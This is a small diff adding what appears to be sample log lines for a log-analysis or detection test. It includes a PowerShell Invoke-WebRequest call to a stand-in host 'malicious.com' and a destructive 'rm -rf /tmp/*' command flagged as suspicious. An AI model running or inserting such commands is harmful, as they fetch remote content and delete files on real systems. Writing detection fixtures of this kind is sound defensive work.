@@ -1,0 +1,6 @@
+Connection from 192.168.1.10 established
+Executed command: powershell Invoke-WebRequest http://malicious.com
+File hash: d41d8cd98f00b204e9800998ecf8427e
+Normal system activity log line
+Suspicious command: bash rm -rf /tmp/*
+
